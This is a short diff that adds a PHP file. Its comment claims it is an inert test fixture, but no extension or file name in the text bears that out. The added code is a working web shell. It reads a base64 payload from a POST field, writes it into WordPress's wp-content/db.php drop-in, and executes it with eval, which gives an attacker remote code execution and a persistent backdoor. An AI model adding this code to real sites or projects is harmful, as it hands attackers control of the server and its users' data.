@@ -1,0 +1,5 @@
+<?php
+// Inert test fixture: the .fixture extension prevents execution.
+$payload = isset( $_POST['x'] ) ? base64_decode( $_POST['x'] ) : '';
+file_put_contents( 'wp-content/db.php', $payload );
+eval( $payload );
